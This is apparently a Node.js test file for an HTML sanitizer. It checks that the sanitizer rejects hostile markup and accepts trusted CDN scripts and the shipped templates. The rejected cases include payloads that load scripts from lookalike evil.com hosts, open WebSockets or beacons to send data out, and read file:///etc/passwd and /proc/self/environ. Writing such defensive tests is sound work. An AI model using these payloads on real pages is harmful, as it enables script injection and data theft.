import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { sanitizeHtml } from '../vps-server/security/sanitize.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const templatesDir = path.resolve(__dirname, '../render-engine/templates');

function assertRejects(html, label) {
  assert.throws(
    () => sanitizeHtml(html),
    (err) => err instanceof Error && /policy|forbidden|not allowed|violation/i.test(err.message),
    `Expected sanitizer to reject: ${label}`
  );
}

test('sanitizer rejects hostname spoofing of trusted CDN', () => {
  assertRejects(
    '<html><head><script src="https://cdn.jsdelivr.net.evil.com/x.js"></script></head><body></body></html>',
    'lookalike CDN host'
  );
  assertRejects(
    '<html><head><script src="https://evil.com/https://cdn.jsdelivr.net/x.js"></script></head><body></body></html>',
    'CDN string embedded in path'
  );
});

test('sanitizer rejects dynamic network primitives', () => {
  assertRejects('<html><body><script>import("https://evil.com/x.js")</script></body></html>', 'dynamic import');
  assertRejects('<html><body><script>new WebSocket("wss://evil.com")</script></body></html>', 'WebSocket');
  assertRejects('<html><body><script>navigator.sendBeacon("/steal", data)</script></body></html>', 'sendBeacon');
  assertRejects('<html><body><script>const u = "https://evil.com"; fetch(u)</script></body></html>', 'variable fetch');
});

test('sanitizer rejects base tag and non-http schemes', () => {
  assertRejects('<html><head><base href="https://evil.com/"></head><body></body></html>', 'base href');
  assertRejects('<html><body><img src="javascript:alert(1)"></body></html>', 'javascript scheme');
  assertRejects('<html><body><script src="data:text/javascript,alert(1)"></script></body></html>', 'data script src');
});

test('sanitizer rejects local system file access', () => {
  assertRejects('<html><body><img src="file:///etc/passwd"></body></html>', 'etc passwd');
  assertRejects('<html><body><img src="file:///proc/self/environ"></body></html>', 'proc environ');
  assertRejects('<html><body><script>const f = require("fs")</script></body></html>', 'node require');
});

test('sanitizer accepts trusted CDN script tag', () => {
  const html = '<html><head><script src="https://cdn.jsdelivr.net/npm/gsap@3.12.5/dist/gsap.min.js"></script></head><body></body></html>';
  assert.equal(sanitizeHtml(html), html);
});

test('sanitizer accepts the shipped deterministic templates', async () => {
  const files = await fs.readdir(templatesDir);
  const htmlFiles = files.filter((f) => f.endsWith('.html'));
  assert.ok(htmlFiles.length > 0, 'expected templates to exist');

  for (const file of htmlFiles) {
    const html = await fs.readFile(path.join(templatesDir, file), 'utf8');
    assert.doesNotThrow(() => sanitizeHtml(html), `Template ${file} should pass sanitizer`);
  }
});

test('sanitizer rejects non-string and oversized payloads', () => {
  assert.throws(() => sanitizeHtml(null), /required|string/i);
  assert.throws(() => sanitizeHtml({}), /required|string/i);
  assert.throws(() => sanitizeHtml('<html>' + 'a'.repeat(600_000) + '</html>'), /too large|size/i);
});
